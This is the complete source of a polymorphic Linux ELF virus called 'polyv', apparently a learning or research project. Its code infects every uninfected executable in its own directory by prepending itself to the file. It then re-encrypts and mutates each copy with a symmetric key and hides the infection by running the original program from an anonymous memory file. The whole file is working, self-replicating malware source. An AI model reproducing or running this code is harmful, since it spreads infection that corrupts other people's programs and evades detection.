
#define POLYV_USE_ENCRYPTED_SECTION
#define POLYV_IMPLEMENTATION
#include <polyv.h>

#include <dirent.h>
#include <sys/sendfile.h>

/// Hardcoded size of the generated elf executable in bytes
#define POLYV_CLIENT_SIZE 40128

int POLYV_ENCRYPTED infect(const char* argv_0) {

    char path_client[256];
    char path_target[516];

    // Find base directory
    size_t delta = (size_t)strrchr(argv_0, '/') - (size_t)argv_0;
    memcpy(path_client, argv_0, delta);
    path_client[delta] = '\0';

    printf("polyv base path: %s\n", path_client);
    struct dirent* entry;

    // ===============================================================
    // Copy malware ELF to memory

    printf("storing malware ELF in memory... ");
    
    int this_fd = open(argv_0, O_RDONLY);
    char* polyv = (char*)malloc(POLYV_CLIENT_SIZE);

    ssize_t bytes = 0;
    while (bytes != POLYV_CLIENT_SIZE) {
        ssize_t s = read(this_fd, (void*)(polyv + bytes), POLYV_CLIENT_SIZE);
        if (s < 0) return -1;
        bytes += s;
    }
    
    printf("DONE (%d bytes)\n", POLYV_CLIENT_SIZE);
    close(this_fd);

    // ===============================================================
    // Explore file tree

    DIR *dir;
    if (!(dir = opendir(path_client)))
        return -1;

    while((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            snprintf(path_target, 1024, "%s/%s", path_client, entry->d_name);

            elf64 elf;
            if (!polyv_load_elf64(&elf, path_target))
                continue;

            // Check if already infected
            const Elf64_Shdr* etext = polyv_lookup_section(&elf, POLYV_ENCRYPTED_SECTION);
            if (etext != NULL) {
                polyv_unload_elf64(&elf);
                continue;
            }

            // ===============================================================
            // Copy target ELF to memory

            printf("storing target[%s] ELF to memory... ", entry->d_name);
            int target_fd = open(path_target, O_RDWR);
            if (target_fd < 0) {
                polyv_unload_elf64(&elf);
                continue;
            }

            struct stat target_stat;
            if (fstat(target_fd, &target_stat) < 0) {
                polyv_unload_elf64(&elf);
                close(target_fd);
                continue;
            }

            char* target = (char*)malloc(target_stat.st_size);
            bytes = 0;
            while (bytes != target_stat.st_size) {
                ssize_t s = read(target_fd, (void*)(target + bytes), target_stat.st_size);
                if (s < 0) return -1;
                bytes += s;
            }

            printf("DONE (%ld bytes)\n", target_stat.st_size);

            // ===============================================================
            // Copy malware ELF on top of target ELF

            printf("infecting target[%s]... ", entry->d_name);

            lseek(target_fd, 0, SEEK_SET);
            write(target_fd, (void*)polyv, POLYV_CLIENT_SIZE);
            write(target_fd, (void*)target, target_stat.st_size);
            
            printf("DONE\n");

            polyv_unload_elf64(&elf);
            close(target_fd);
            delete target;

            // ===============================================================
            // Mutate copied malware

            int muterr;
            printf("mutating target[%s]... ", entry->d_name);
            if ((muterr = polyv_mutate_elf64(path_target, NULL, POLYV_KEY_SIZE)) < 0)
                return muterr;

            printf("DONE\n");
        }
    }

    delete polyv;
    return 0;
}

// Execute infected host
int POLYV_ENCRYPTED infected_exec(int argc, char* argv[], char* arge[]) {

    // Load self ELF to memory
    int self_fd = open(argv[0], O_RDONLY);
    if (self_fd < 0)
        return -1;

    struct stat self_stat;
    if (fstat(self_fd, &self_stat) < 0)
        return -1;

    // Find size of self
    const size_t infected_size = self_stat.st_size - POLYV_CLIENT_SIZE;
    if (infected_size == 0) {
        close(self_fd);
        return 0;
    }

    printf("executing infected host...");

    // Create a hidden file descriptor with the infected ELF
    // and executes it

    off_t polyv_size = POLYV_CLIENT_SIZE;
    int exec_fd = memfd_create("infected", MFD_CLOEXEC);
    if (exec_fd < 0)
        return -1;

    if (sendfile(exec_fd, self_fd, &polyv_size, infected_size) < 0) {
        close(exec_fd);
        return -1;
    }
    
    close(self_fd);
    return fexecve(exec_fd, argv, arge);
}

/// Main entry point of the malware 
int POLYV_ENCRYPTED payload(int argc, char* argv[], char* arge[]) {

    /**
    * To infect other programs the malware does this:
    *  - Stores malware and target ELFs in memory 
    *  - Append malware ELF on top of target file
    */
    infect(argv[0]);

    // Execute infected host to mimic normal usage
    return infected_exec(argc, argv, arge);
}

int main(int argc, char* argv[], char* arge[]) {

    printf("Key (hex):");
    for(size_t i = 0; i < POLYV_KEY_SIZE; i++) {
        if (i % 32 == 0) printf("\n\t");
        printf("%02x ", ((unsigned char*)polyv_symmetric_key)[i]);
    }
    printf("\n");

    // Decrypt and launch payload
    {
        // If the program has not been ignited then the key is all zero 
        // and encrypting/decrypting does nothing!
        polyv_self_sxor(polyv_symmetric_key, POLYV_KEY_SIZE);
        payload(argc, argv, arge);
        polyv_self_sxor(polyv_symmetric_key, POLYV_KEY_SIZE);
    }

    // This should crash
    //payload(argc, argv);
    
    return 0;
}